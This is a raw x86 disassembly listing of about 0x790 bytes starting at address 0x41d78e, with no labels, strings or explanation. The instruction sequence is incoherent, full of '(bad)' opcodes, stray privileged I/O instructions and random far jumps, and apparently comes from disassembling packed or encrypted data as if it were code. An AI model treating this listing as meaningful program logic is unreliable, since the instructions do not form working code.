  41d78e:	das    
  41d78f:	jae    0x41d760
  41d791:	sub    ecx,DWORD PTR [eax+0x79]
  41d794:	xor    al,0x36
  41d796:	xor    DWORD PTR ds:0xab5e3cae,ebp
  41d79c:	jge    0x41d7a1
  41d79e:	xor    DWORD PTR [ecx-0x3051ff27],edx
  41d7a4:	(bad)  
  41d7a5:	xor    BYTE PTR [ebp-0xdfdb43d],ah
  41d7ab:	loope  0x41d7ff
  41d7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7ae:	int    0x10
  41d7b0:	mov    dh,0x2f
  41d7b2:	adc    ebp,ebp
  41d7b4:	ficom  WORD PTR [ebx]
  41d7b6:	xchg   esi,eax
  41d7b7:	ret    0x9700
  41d7ba:	xchg   DWORD PTR [edx],esi
  41d7bc:	popa   
  41d7bd:	cmp    BYTE PTR [ecx-0x34234158],dh
  41d7c3:	retf   
  41d7c4:	pop    ecx
  41d7c5:	add    BYTE PTR [edx+0x2b4ad55d],cl
  41d7cb:	cmp    al,0xf7
  41d7cd:	sti    
  41d7ce:	sbb    BYTE PTR [ecx],ah
  41d7d0:	xchg   edx,eax
  41d7d1:	pop    edx
  41d7d2:	xchg   edi,eax
  41d7d3:	addr16 mov bh,0x89
  41d7d6:	cs jmp 0xe74a:0x9dc056c0
  41d7de:	mov    ds:0xe2068490,al
  41d7e3:	sub    eax,0xe0351f62
  41d7e8:	cmp    BYTE PTR ds:0x895e3f66,dh
  41d7ee:	dec    edx
  41d7ef:	xlat   BYTE PTR ds:[ebx]
  41d7f0:	jne    0x41d7e1
  41d7f2:	pop    edi
  41d7f3:	inc    edx
  41d7f4:	imul   eax,DWORD PTR [esi+0x79],0xc3f07fb7
  41d7fb:	mov    ah,0x2b
  41d7fd:	leave  
  41d7fe:	mov    bl,0xda
  41d800:	call   0xe45263dc
  41d805:	pop    esi
  41d806:	bound  edi,QWORD PTR [ecx+0x4d]
  41d809:	add    cl,BYTE PTR [eax]
  41d80b:	(bad)  
  41d80c:	scas   al,BYTE PTR es:[edi]
  41d80d:	retf   
  41d80e:	xor    BYTE PTR [ebx+ecx*4],bh
  41d811:	mov    ebp,0x6020769d
  41d816:	or     al,BYTE PTR [ebp+0x1de7458c]
  41d81c:	jnp    0x41d826
  41d81e:	and    DWORD PTR [esp+eiz*8+0x34ccd663],edx
  41d825:	inc    esp
  41d826:	sub    al,0x3d
  41d828:	repz sbb ch,BYTE PTR [eax]
  41d82b:	dec    esp
  41d82c:	and    al,0xb6
  41d82f:	adc    BYTE PTR fs:[ebp-0x1d],ch
  41d833:	mov    cl,0xfc
  41d835:	sub    esi,DWORD PTR [edi]
  41d837:	fbld   TBYTE PTR [eax+0x5b27bcdc]
  41d83d:	xor    al,0xf1
  41d83f:	push   ecx
  41d840:	adc    BYTE PTR [ecx],0x40
  41d843:	popf   
  41d844:	adc    dh,BYTE PTR [edx+0x28ca86a3]
  41d84a:	test   eax,0xde494618
  41d84f:	aam    0xf1
  41d851:	xchg   ebp,eax
  41d852:	mov    ecx,0xac5a05d1
  41d857:	cmp    ebx,DWORD PTR [eax+0x78]
  41d85a:	mov    BYTE PTR fs:[ebp-0x48],dl
  41d85e:	add    ecx,DWORD PTR [ebx]
  41d860:	fmul   QWORD PTR [edi]
  41d862:	es xchg di,ax
  41d865:	ins    BYTE PTR es:[edi],dx
  41d866:	xchg   BYTE PTR [ebx],dl
  41d868:	imul   edi,DWORD PTR [ecx+ecx*2+0x32462d68],0x5116b112
  41d873:	cmp    eax,DWORD PTR [edi-0x678b21b5]
  41d879:	in     eax,0xf7
  41d87b:	lods   al,BYTE PTR ds:[esi]
  41d87c:	inc    ebp
  41d87d:	jbe    0x41d839
  41d87f:	gs lahf 
  41d881:	ror    DWORD PTR [ebp+eax*2+0x56],0x5a
  41d886:	adc    bh,BYTE PTR [ecx]
  41d888:	xlat   BYTE PTR ds:[ebx]
  41d889:	call   0xfb10b446
  41d88e:	jmp    0x45bd5929
  41d893:	cmp    al,0x27
  41d895:	out    dx,eax
  41d896:	xchg   edi,eax
  41d897:	xor    DWORD PTR [edx],ebx
  41d899:	icebp  
  41d89a:	fst    st(7)
  41d89c:	ins    DWORD PTR es:[edi],dx
  41d89d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d89e:	inc    ecx
  41d89f:	mov    ebx,eax
  41d8a1:	sub    BYTE PTR [esi+0x1021ea1b],ch
  41d8a7:	xor    eax,0xb2b5502d
  41d8ac:	fdiv   QWORD PTR [ebp+0x42]
  41d8af:	ss je  0x41d86d
  41d8b2:	out    0xcf,eax
  41d8b4:	popa   
  41d8b5:	aaa    
  41d8b6:	fadd   QWORD PTR [ecx-0x56]
  41d8b9:	push   0x35
  41d8bb:	cdq    
  41d8bc:	ins    BYTE PTR es:[edi],dx
  41d8bd:	mov    ebp,0x4404c71e
  41d8c2:	repnz mov bl,0x44
  41d8c5:	scas   eax,DWORD PTR es:[edi]
  41d8c6:	add    cl,BYTE PTR [ecx]
  41d8c8:	inc    ebx
  41d8c9:	xchg   edi,eax
  41d8ca:	push   ebx
  41d8cb:	push   esi
  41d8cc:	and    eax,0x4de46f2
  41d8d1:	aad    0xa9
  41d8d3:	cmp    BYTE PTR [ebp+0x60],al
  41d8d6:	adc    eax,0x10be03b8
  41d8db:	dec    ebp
  41d8dc:	call   0x3756cef6
  41d8e1:	in     eax,dx
  41d8e2:	lds    esi,FWORD PTR [esi+ebp*4+0x43ffd515]
  41d8e9:	xor    al,0xc3
  41d8eb:	div    DWORD PTR [esi-0x25]
  41d8ee:	icebp  
  41d8ef:	add    bh,BYTE PTR [ecx+ebp*4+0x29]
  41d8f3:	daa    
  41d8f4:	fldenv [ebx]
  41d8f6:	push   eax
  41d8f7:	pop    ss
  41d8f8:	cdq    
  41d8f9:	ins    BYTE PTR es:[edi],dx
  41d8fa:	and    BYTE PTR [ecx*8-0x49aa0c55],ah
  41d901:	pop    ecx
  41d902:	bound  eax,QWORD PTR [esi]
  41d904:	loope  0x41d92d
  41d906:	and    bh,dh
  41d908:	std    
  41d909:	outs   dx,BYTE PTR ds:[esi]
  41d90a:	adc    al,0x57
  41d90c:	add    al,0xde
  41d90e:	or     ebp,ebx
  41d910:	cdq    
  41d911:	push   ebp
  41d912:	sbb    dl,BYTE PTR [edi+edx*4]
  41d915:	ss xchg ecx,eax
  41d917:	fdivr  QWORD PTR [edx+0x6e]
  41d91a:	int    0xdf
  41d91c:	inc    edx
  41d91d:	(bad)  
  41d91f:	jb     0x41d8d5
  41d921:	cmc    
  41d922:	mov    ch,0xf1
  41d924:	sar    BYTE PTR [esi-0x2e],1
  41d927:	or     edx,DWORD PTR [ebp-0x71]
  41d92a:	and    BYTE PTR [esi-0x37d4d3e6],cl
  41d930:	sbb    DWORD PTR [esi-0x76],ebx
  41d933:	mov    ds,edx
  41d935:	mov    ds:0x521d7e32,al
  41d93a:	jmp    0xab033e4f
  41d93f:	cld    
  41d940:	inc    ebx
  41d941:	add    eax,0x9f99e835
  41d946:	sar    BYTE PTR ds:0x6dd01371,cl
  41d94c:	adc    ebx,edi
  41d94e:	mov    cl,dh
  41d950:	rcr    BYTE PTR [eax],cl
  41d952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d953:	sub    BYTE PTR [edx],dl
  41d955:	dec    edi
  41d956:	or     ch,BYTE PTR [ecx-0x2e15ad8f]
  41d95c:	in     al,0xed
  41d95e:	xor    BYTE PTR [edx],bl
  41d960:	outs   dx,BYTE PTR ds:[esi]
  41d961:	outs   dx,DWORD PTR ds:[esi]
  41d962:	mov    esi,0x2efb2119
  41d967:	(bad)  
  41d968:	(bad)  
  41d96a:	xchg   edx,eax
  41d96b:	rol    edi,0x32
  41d96e:	std    
  41d96f:	data16 sub bh,dl
  41d972:	retf   
  41d973:	xchg   ebp,eax
  41d974:	hlt    
  41d975:	loopne 0x41d956
  41d977:	(bad)  
  41d978:	ja     0x41d98f
  41d97a:	mov    ch,0x11
  41d97c:	pusha  
  41d97d:	push   ds
  41d97e:	fucomp st(6)
  41d980:	cld    
  41d981:	mov    esp,0xb30f12b2
  41d986:	int3   
  41d987:	jbe    0x41d960
  41d989:	jg     0x41d9a5
  41d98b:	fprem1 
  41d98d:	add    ecx,DWORD PTR [esi]
  41d98f:	mov    edx,0x1635e656
  41d994:	sbb    eax,0xb1af2599
  41d999:	push   0xffffffa3
  41d99b:	outs   dx,DWORD PTR ds:[esi]
  41d99c:	les    ecx,FWORD PTR [edi+0x5a6dd58c]
  41d9a2:	fisttp DWORD PTR [esp+eiz*4-0x4e]
  41d9a6:	cmc    
  41d9a7:	push   ebp
  41d9a8:	hlt    
  41d9a9:	mov    ah,0x57
  41d9ab:	shl    esi,0x82
  41d9ae:	sub    bl,BYTE PTR [eax]
  41d9b0:	sahf   
  41d9b1:	inc    eax
  41d9b2:	loopne 0x41d9ac
  41d9b4:	pop    eax
  41d9b5:	push   0x7a
  41d9b7:	add    eax,0x771a1f43
  41d9bc:	xchg   ecx,eax
  41d9bd:	jge    0x41da10
  41d9bf:	clc    
  41d9c0:	mov    esi,0x4ae6bd12
  41d9c5:	adc    eax,esp
  41d9c7:	push   cs
  41d9c8:	xchg   BYTE PTR [esi+0x12],ch
  41d9cb:	mov    gs,WORD PTR [esi+0xb322f10]
  41d9d1:	fnstcw WORD PTR [eax]
  41d9d3:	loopne 0x41d9d0
  41d9d5:	shl    dh,cl
  41d9d7:	dec    ebp
  41d9d8:	popf   
  41d9d9:	jle    0x41d9e4
  41d9db:	add    eax,ecx
  41d9dd:	pushf  
  41d9de:	sbb    cl,BYTE PTR [ebp+0x1a5e0c00]
  41d9e4:	sbb    DWORD PTR [edi],eax
  41d9e6:	dec    edi
  41d9e7:	out    dx,eax
  41d9e8:	imul   edi,DWORD PTR [ecx+0x5fb579dc],0x37
  41d9ef:	push   edx
  41d9f0:	aaa    
  41d9f1:	dec    ecx
  41d9f2:	fcmovb st,st(1)
  41d9f4:	dec    edx
  41d9f5:	xor    edi,DWORD PTR [ebx-0x542f93a1]
  41d9fb:	imul   ebx,eax,0x1172bc7e
  41da01:	xchg   ebp,eax
  41da02:	and    al,0xff
  41da04:	adc    BYTE PTR [ebx],dh
  41da06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da07:	fild   DWORD PTR [ebp-0x5f371bf7]
  41da0d:	cmp    esi,DWORD PTR [ecx+0xa08bbb3]
  41da13:	mov    al,ds:0xfd5a4b54
  41da18:	bound  ecx,QWORD PTR [ebx]
  41da1a:	inc    edi
  41da1b:	sbb    DWORD PTR [edx],ecx
  41da1d:	jne    0x41da1a
  41da1f:	jae    0x41d9e8
  41da21:	into   
  41da22:	push   ebx
  41da23:	xor    cl,0xcb
  41da26:	adc    bh,BYTE PTR [edx+0x411b7c56]
  41da2c:	sbb    DWORD PTR [eax],ebp
  41da2e:	adc    DWORD PTR [edi-0x29],ebx
  41da31:	int    0xf
  41da33:	retf   0xd58
  41da36:	fadd   st(3),st
  41da38:	dec    edx
  41da39:	dec    eax
  41da3a:	xchg   ecx,eax
  41da3b:	ret    
  41da3c:	icebp  
  41da3d:	cmp    bh,BYTE PTR [ebx]
  41da3f:	mov    eax,0x965405a9
  41da44:	(bad)  
  41da45:	push   ebp
  41da46:	dec    esi
  41da47:	push   cs
  41da48:	jb     0x41d9e7
  41da4a:	xchg   esi,eax
  41da4b:	inc    eax
  41da4c:	sbb    esi,DWORD PTR [edi]
  41da4e:	jnp    0x41da95
  41da50:	in     eax,dx
  41da51:	inc    ecx
  41da52:	mov    al,ds:0xdefb0738
  41da57:	or     DWORD PTR [edi+ebp*2-0x59],ecx
  41da5b:	bound  esi,QWORD PTR [eax-0x2a86fd79]
  41da61:	(bad)  
  41da62:	jmp    0x41da0d
  41da64:	std    
  41da65:	rcl    dl,cl
  41da67:	ss inc edx
  41da69:	push   ds
  41da6a:	in     al,0x65
  41da6c:	push   cs
  41da6d:	sti    
  41da6e:	call   0x8728b04d
  41da73:	and    eax,0xe4c17415
  41da78:	gs mov ecx,0xc421a044
  41da7e:	fisub  DWORD PTR [ebp-0x7f]
  41da81:	(bad)  
  41da82:	cmp    edi,DWORD PTR [esi+0x6020d78d]
  41da88:	xor    al,0x96
  41da8a:	push   es
  41da8b:	cmp    BYTE PTR [edi-0x22],ah
  41da8e:	nop
  41da8f:	aam    0x3
  41da91:	and    ch,BYTE PTR [ebx+0x65]
  41da94:	and    al,0xed
  41da96:	and    dl,BYTE PTR [ebx]
  41da98:	repz sbb al,0x66
  41da9b:	sbb    eax,0x757c745e
  41daa0:	push   ecx
  41daa1:	xchg   ebp,eax
  41daa2:	stc    
  41daa3:	inc    esi
  41daa4:	pop    ebx
  41daa5:	mov    ds:0x84d35470,al
  41daaa:	out    dx,al
  41daab:	add    al,0xb0
  41daad:	outs   dx,BYTE PTR ds:[esi]
  41daae:	bound  ebp,QWORD PTR [ebx+0x5]
  41dab1:	mov    al,ah
  41dab3:	push   ecx
  41dab4:	scas   eax,DWORD PTR es:[edi]
  41dab5:	aad    0xaf
  41dab7:	cmp    BYTE PTR [ecx-0x46],cl
  41daba:	mov    ecx,0xaf62e04e
  41dabf:	call   0x6552:0x80978702
  41dac6:	add    al,0x47
  41dac8:	mov    ds:0x610f3bd5,eax
  41dacd:	test   edx,0x61dd2541
  41dad3:	(bad)  
  41dad4:	cmp    al,0x6a
  41dad6:	sub    eax,DWORD PTR [ebx-0x5c201235]
  41dadc:	je     0x41db19
  41dade:	mov    dh,al
  41dae0:	popf   
  41dae1:	loope  0x41db12
  41dae3:	(bad)  
  41dae4:	jmp    0x880f:0xc1853ddb
  41daeb:	(bad)  
  41daec:	cmp    DWORD PTR [eax],ebp
  41daee:	call   FWORD PTR [edi]
  41daf0:	inc    esi
  41daf1:	mov    esp,0xb5c6d709
  41daf6:	push   esi
  41daf7:	or     esi,DWORD PTR [ebx+0x38]
  41dafa:	scas   eax,DWORD PTR es:[edi]
  41dafb:	jecxz  0x41da89
  41dafd:	shl    DWORD PTR [esi+0x50da22cd],0x85
  41db04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db05:	xchg   ebx,eax
  41db06:	mov    ebp,0x31498a3
  41db0b:	cwde   
  41db0c:	xchg   ebx,eax
  41db0d:	popf   
  41db0e:	scas   al,BYTE PTR es:[edi]
  41db0f:	sbb    al,0x6c
  41db11:	push   es
  41db12:	jg     0x41db64
  41db14:	jecxz  0x41db0f
  41db16:	call   0x541c:0xa9dcfd3f
  41db1d:	xor    DWORD PTR [edx],ebx
  41db1f:	cmc    
  41db20:	fwait
  41db21:	bswap  ecx
  41db23:	(bad)  
  41db24:	jle    0x41db34
  41db26:	dec    edx
  41db27:	push   edx
  41db28:	fcmovu st,st(1)
  41db2a:	outs   dx,DWORD PTR ds:[esi]
  41db2b:	out    0x2d,al
  41db2d:	ss mov edx,0xd5f17b91
  41db33:	sub    esp,DWORD PTR [ebx]
  41db35:	mov    esp,0xa78a8bc2
  41db3a:	in     al,dx
  41db3b:	cli    
  41db3c:	fcmovbe st,st(2)
  41db3e:	add    ecx,DWORD PTR [edx+0x7c9c33f7]
  41db44:	data16 jle 0x41db10
  41db47:	pop    ebx
  41db48:	test   DWORD PTR [ecx+0x4b0fb48],ebp
  41db4e:	and    al,0xe5
  41db50:	pop    es
  41db51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db52:	aaa    
  41db53:	lods   eax,DWORD PTR ds:[esi]
  41db54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db55:	jle    0x41dafc
  41db57:	push   eax
  41db58:	leave  
  41db59:	pop    ebp
  41db5a:	dec    edi
  41db5b:	push   ebx
  41db5c:	mov    ah,0xa0
  41db5e:	pop    edi
  41db5f:	adc    ecx,esi
  41db61:	cmp    edi,DWORD PTR [edi]
  41db63:	es pop ebp
  41db65:	js     0x41db36
  41db67:	nop
  41db68:	and    eax,0x7100f905
  41db6d:	mov    esp,0xa96b1a65
  41db72:	std    
  41db73:	jne    0x41dbc4
  41db75:	inc    esp
  41db76:	aas    
  41db77:	test   eax,0xd4347bc
  41db7c:	mov    bh,0xd9
  41db7e:	pop    eax
  41db7f:	std    
  41db80:	bnd jno 0x41dbe5
  41db83:	fimul  DWORD PTR [ecx-0x61b4367c]
  41db89:	pop    ds
  41db8a:	(bad)  [edi+0x6540a613]
  41db90:	dec    edx
  41db91:	jp     0x41db18
  41db93:	shl    BYTE PTR [edx+0x364267f4],0x49
  41db9a:	dec    esi
  41db9b:	push   es
  41db9c:	push   0xb2755f11
  41dba1:	or     DWORD PTR [ecx-0x683a6241],ebx
  41dba7:	fcomp  DWORD PTR [edi+0x30]
  41dbaa:	xor    eax,0x3c42c4ca
  41dbaf:	mov    eax,ds:0x3a531284
  41dbb4:	aas    
  41dbb5:	jo     0x41db73
  41dbb7:	sub    DWORD PTR [ebx+0x28d81ba5],esi
  41dbbd:	rcl    BYTE PTR [esi+0x332590ed],0x40
  41dbc4:	mov    esp,0xfbb0f454
  41dbc9:	(bad)  
  41dbcb:	mov    ch,0x79
  41dbcd:	cli    
  41dbce:	and    al,0xe3
  41dbd0:	fwait
  41dbd1:	enter  0x2163,0x5
  41dbd5:	mov    al,ds:0x7e92b664
  41dbda:	enter  0x22ce,0x37
  41dbde:	(bad)  
  41dbdf:	popf   
  41dbe0:	push   eax
  41dbe1:	stos   DWORD PTR es:[edi],eax
  41dbe2:	call   0x4de4688f
  41dbe7:	in     al,0x41
  41dbe9:	in     al,dx
  41dbea:	icebp  
  41dbeb:	sar    DWORD PTR [ecx-0x1dd96776],0x7f
  41dbf2:	les    edx,FWORD PTR [edi]
  41dbf4:	out    0x2b,eax
  41dbf6:	mov    bl,0x25
  41dbf8:	inc    edx
  41dbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbfa:	dec    al
  41dbfc:	fdivr  QWORD PTR [ebx-0x7594632f]
  41dc02:	inc    esi
  41dc03:	or     DWORD PTR [ebp+0xa],esp
  41dc06:	pop    ds
  41dc07:	es retf 0xe3e2
  41dc0b:	call   0x8aa2:0xbf8958bb
  41dc12:	lock or eax,0x10a0f7d2
  41dc18:	aaa    
  41dc19:	fdiv   DWORD PTR [ecx+0x3a64941f]
  41dc1f:	mov    dl,0xf0
  41dc21:	cli    
  41dc22:	push   eax
  41dc23:	retf   
  41dc24:	pop    edi
  41dc25:	cmc    
  41dc26:	icebp  
  41dc27:	rol    BYTE PTR [esi],cl
  41dc29:	xchg   ebp,eax
  41dc2a:	fiadd  WORD PTR [edx-0x6e]
  41dc2d:	push   ds
  41dc2e:	(bad)  
  41dc2f:	in     al,0xfa
  41dc31:	and    edi,DWORD PTR [eax-0x69f24c63]
  41dc37:	mov    ch,0x2a
  41dc39:	out    0x4b,eax
  41dc3b:	call   0x9bd:0x6983c7cc
  41dc42:	icebp  
  41dc43:	push   ds
  41dc44:	sub    eax,0xd9aef449
  41dc49:	in     al,dx
  41dc4a:	mov    eax,ds:0xcc2f4256
  41dc4f:	xor    eax,0x352159c6
  41dc54:	push   ebp
  41dc55:	fsub   DWORD PTR [ecx-0x51]
  41dc58:	dec    esi
  41dc59:	jne    0x41dcd2
  41dc5b:	mov    edi,0x2d1b5292
  41dc60:	daa    
  41dc61:	inc    ecx
  41dc62:	add    edx,eax
  41dc64:	xchg   DWORD PTR [ebx+0x4f7d13e7],ebx
  41dc6a:	sbb    al,0x4b
  41dc6c:	movlps xmm5,QWORD PTR [esp+ebp*2]
  41dc70:	jmp    0x2757:0x1db4a56
  41dc77:	xlat   BYTE PTR ds:[ebx]
  41dc78:	pop    es
  41dc79:	test   al,0x13
  41dc7b:	loop   0x41dc28
  41dc7d:	sub    ch,BYTE PTR [eax-0x2f89c87b]
  41dc83:	and    al,0x41
  41dc85:	(bad)  [eax+0x4e10d972]
  41dc8b:	aas    
  41dc8c:	inc    edx
  41dc8d:	jg     0x41dc5c
  41dc8f:	lds    esi,FWORD PTR [ecx]
  41dc91:	cmc    
  41dc92:	arpl   ax,bp
  41dc94:	pop    edx
  41dc95:	ss out 0x8a,eax
  41dc98:	adc    al,BYTE PTR [ebx+0x30]
  41dc9b:	loopne 0x41dc70
  41dc9d:	leave  
  41dc9e:	es mov edx,0x8517729c
  41dca4:	cmp    BYTE PTR [ebx-0x14],ch
  41dca7:	ins    BYTE PTR es:[edi],dx
  41dca8:	add    al,dl
  41dcaa:	add    ecx,DWORD PTR [ecx]
  41dcac:	sahf   
  41dcad:	aaa    
  41dcae:	cmp    BYTE PTR [edi+0x131aed0c],ah
  41dcb4:	call   0x21d6:0x7eaf25b1
  41dcbb:	mov    bh,0x15
  41dcbd:	pop    ebp
  41dcbe:	aas    
  41dcbf:	dec    edi
  41dcc0:	cld    
  41dcc1:	mov    eax,ds:0x78eb7f9b
  41dcc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcc7:	xchg   esp,eax
  41dcc8:	cmp    eax,DWORD PTR [ebp-0x208778ee]
  41dcce:	bnd jge 0x41dce9
  41dcd1:	jp     0x41dd06
  41dcd3:	sar    esp,0x54
  41dcd6:	sbb    eax,0x40f1b3b1
  41dcdb:	mov    cl,0x31
  41dcdd:	jmp    0x847bdf70
  41dce2:	dec    edi
  41dce3:	cmp    edx,0x90c7175a
  41dce9:	mov    cl,0xf
  41dceb:	ror    bh,0x59
  41dcee:	pop    edi
  41dcef:	push   es
  41dcf0:	iret   
  41dcf1:	fs enter 0xe7b0,0x18
  41dcf6:	(bad)  
  41dcf7:	sti    
  41dcf8:	es mov ecx,0xad437335
  41dcfe:	xchg   bh,ch
  41dd00:	inc    edx
  41dd01:	mov    ecx,0x74a6de5b
  41dd06:	pop    edx
  41dd07:	nop
  41dd08:	add    al,0xe7
  41dd0a:	xchg   BYTE PTR [edx],al
  41dd0c:	xor    esi,DWORD PTR [ebx]
  41dd0e:	xchg   ebx,eax
  41dd0f:	push   0x9eece2bb
  41dd14:	test   eax,0x56a33309
  41dd19:	fild   WORD PTR [eax+0x364b04a7]
  41dd1f:	lods   al,BYTE PTR ds:[esi]
  41dd20:	sub    bl,bh
  41dd22:	jg     0x41dd34
  41dd24:	jl     0x41dcb7
  41dd26:	pop    edx
  41dd27:	scas   eax,DWORD PTR es:[edi]
  41dd28:	cmp    ebx,DWORD PTR [esi]
  41dd2a:	stc    
  41dd2b:	dec    ecx
  41dd2c:	rcl    ebx,1
  41dd2e:	in     al,dx
  41dd2f:	jl     0x41dd9d
  41dd31:	out    0xac,al
  41dd33:	mov    eax,0x3500c833
  41dd38:	fdiv   DWORD PTR [edx-0x11df458b]
  41dd3e:	xor    BYTE PTR [ebx],dl
  41dd40:	pop    edi
  41dd42:	cs retf 
  41dd44:	les    ecx,FWORD PTR ds:0xa2cef2e7
  41dd4a:	adc    DWORD PTR [edi+edx*1+0x3d],ebp
  41dd4e:	fisub  DWORD PTR [esi+0x44]
  41dd51:	std    
  41dd52:	into   
  41dd53:	adc    eax,0x18b824ea
  41dd58:	ret    0xed99
  41dd5b:	test   WORD PTR [esi+0x1c2fbd5c],0x1481
  41dd64:	loop   0x41ddb2
  41dd66:	and    esp,ebx
  41dd68:	outs   dx,BYTE PTR ds:[esi]
  41dd69:	and    edi,DWORD PTR [edx]
  41dd6b:	fst    QWORD PTR [esi]
  41dd6d:	(bad)  
  41dd6e:	lods   al,BYTE PTR ds:[esi]
  41dd6f:	cwde   
  41dd70:	fist   DWORD PTR [edi]
  41dd72:	fwait
  41dd73:	pop    ebp
  41dd74:	sub    eax,0xb7f5f88d
  41dd79:	jno    0x41dd95
  41dd7b:	fs addr16 or al,0x7c
  41dd7f:	push   eax
  41dd80:	in     al,dx
  41dd81:	repz mov ebp,0x4b71136d
  41dd87:	mov    al,0xc
  41dd89:	data16 (bad) [edi-0x33bd264b]
  41dd90:	sub    cl,BYTE PTR [esi]
  41dd92:	mov    ds,WORD PTR [esi+0x51]
  41dd95:	mov    esi,0xef927db0
  41dd9a:	imul   edi,DWORD PTR [ecx+0x22028acd],0xc1987c73
  41dda4:	je     0x41ddbc
  41dda6:	mov    cl,0xbe
  41dda8:	ret    
  41dda9:	pop    ebx
  41ddaa:	retf   0xdda4
  41ddad:	xchg   edi,eax
  41ddae:	or     eax,0xfba0d03f
  41ddb3:	mov    esi,0x6454cc13
  41ddb8:	sub    eax,DWORD PTR [eax-0x6bbc0aee]
  41ddbe:	dec    edx
  41ddbf:	cwde   
  41ddc0:	push   eax
  41ddc1:	xor    edi,DWORD PTR [edx+eax*2+0x7f550bd2]
  41ddc8:	ja     0x41de38
  41ddca:	dec    edx
  41ddcb:	push   esi
  41ddcc:	pusha  
  41ddcd:	adc    eax,0x8723b13
  41ddd2:	sbb    dh,BYTE PTR [ebp+0x3599012f]
  41ddd8:	fisubr DWORD PTR [edi-0x4a5949ce]
  41ddde:	xor    bh,BYTE PTR [ebp+0x36]
  41dde1:	pop    esp
  41dde2:	xor    esi,DWORD PTR [ecx]
  41dde4:	int3   
  41dde5:	neg    BYTE PTR [edx-0x5e2f2f8d]
  41ddeb:	addr16 loop 0x41de63
  41ddee:	repnz or bl,BYTE PTR [ebp-0xc]
  41ddf2:	leave  
  41ddf3:	ss nop
  41ddf5:	adc    esp,ebp
  41ddf7:	mov    ebx,0x73e3dc84
  41ddfc:	ds jb  0x41dd80
  41ddff:	ins    BYTE PTR es:[edi],dx
  41de00:	int3   
  41de01:	push   ss
  41de02:	clc    
  41de03:	add    cl,ch
  41de05:	sub    al,0x4
  41de07:	lods   al,BYTE PTR ds:[esi]
  41de08:	xchg   ecx,eax
  41de09:	add    edx,eax
  41de0b:	and    DWORD PTR [ebp+0x6b],0x39
  41de0f:	xor    dh,cl
  41de11:	fcomi  st,st(1)
  41de13:	in     eax,dx
  41de14:	jb     0x41dda2
  41de16:	(bad)  
  41de17:	dec    esp
  41de18:	(bad)  
  41de1a:	bound  esp,QWORD PTR [esi-0x108ef3bc]
  41de20:	xor    eax,DWORD PTR [eax+edx*2-0x9904e12]
  41de27:	push   0x2a
  41de29:	mov    DWORD PTR [edi],0xd9f9363e
  41de2f:	cmc    
  41de30:	ror    ebp,0xdc
  41de33:	in     al,0x3b
  41de35:	cdq    
  41de36:	jae    0x41de0f
  41de38:	(bad)  
  41de3a:	push   eax
  41de3b:	xchg   edx,eax
  41de3c:	int3   
  41de3d:	cmp    ebp,DWORD PTR [ebx-0x58]
  41de40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de41:	mov    bh,0x72
  41de43:	sub    edx,0xc3a53e01
  41de49:	sub    BYTE PTR ds:0xc95cefa2,dh
  41de4f:	dec    ebx
  41de50:	jne    0x41de0e
  41de52:	pop    ss
  41de53:	mov    esi,0x54a5fad1
  41de58:	aam    0xa6
  41de5a:	add    BYTE PTR [esp+esi*2-0x348f7114],cl
  41de61:	fimul  WORD PTR [edx+0x2e96d418]
  41de67:	btr    DWORD PTR [edi-0x3263af82],edi
  41de6e:	jge    0x41de06
  41de70:	fild   DWORD PTR [edi]
  41de72:	mov    ebx,0xf817b609
  41de77:	cmp    eax,DWORD PTR [ebp-0x3a6f859b]
  41de7d:	pop    ebx
  41de7e:	add    ebx,eax
  41de80:	outs   dx,BYTE PTR ds:[esi]
  41de81:	jmp    0x41de09
  41de83:	das    
  41de84:	jbe    0x41dea3
  41de86:	xor    eax,0x63e0a4a4
  41de8b:	add    DWORD PTR [ebx-0x5ee83913],0x243f7771
  41de95:	and    bh,bl
  41de97:	pop    ebp
  41de98:	cmc    
  41de99:	mov    ebp,0x4ad516be
  41de9e:	and    DWORD PTR [ebx],esi
  41dea0:	cmp    dh,BYTE PTR [esi]
  41dea2:	pop    edx
  41dea3:	ror    DWORD PTR [ebp+eiz*2+0x17],0x1
  41dea8:	pop    esi
  41dea9:	shl    ebp,1
  41deab:	or     dl,BYTE PTR [eax-0x55]
  41deae:	je     0x41df29
  41deb0:	ja     0x41de93
  41deb2:	popfw  
  41deb4:	push   eax
  41deb5:	test   eax,0xe43e74c0
  41deba:	pop    ss
  41debb:	pop    ebx
  41debc:	and    ch,BYTE PTR [ecx-0x78]
  41debf:	stos   BYTE PTR es:[edi],al
  41dec0:	push   ss
  41dec1:	call   0xed5c:0x333ab293
  41dec8:	lds    esi,FWORD PTR [ebx-0x7a]
  41decb:	sbb    eax,0x936354ca
  41ded0:	push   0x7b
  41ded2:	sbb    al,0xa4
  41ded4:	push   eax
  41ded5:	push   ds
  41ded6:	push   esp
  41ded7:	push   es
  41ded8:	push   cs
  41ded9:	(bad)  
  41deda:	jg     0x41df12
  41dedc:	fild   QWORD PTR [edi-0x24]
  41dedf:	mov    bh,0x91
  41dee1:	inc    ebx
  41dee2:	fwait
  41dee3:	push   esi
  41dee4:	inc    ecx
  41dee5:	iret   
  41dee6:	sub    al,0xe5
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	nop
  41deea:	nop
  41deeb:	hlt    
  41deec:	push   0x18
  41deee:	ss jp  0x41df0b
  41def1:	sub    al,0xaf
  41def3:	in     eax,0x3e
  41def5:	add    eax,0x55ac3620
  41defa:	and    cl,BYTE PTR [edi+esi*1+0x4b]
  41defe:	adc    esi,edi
  41df00:	sub    bh,BYTE PTR [esi]
  41df02:	cwde   
  41df03:	in     eax,0xf2
  41df05:	mov    ch,0x8b
  41df07:	(bad)  
  41df08:	outs   dx,DWORD PTR ds:[esi]
  41df09:	cmp    eax,0xa22a7a8a
  41df0e:	mov    WORD PTR [esi+0x4a9832f4],fs
  41df14:	in     al,0x7c
  41df16:	jns    0x41df72
  41df18:	mov    dh,0xbc
  41df1a:	pop    edx
  41df1b:	lods   eax,DWORD PTR ds:[esi]
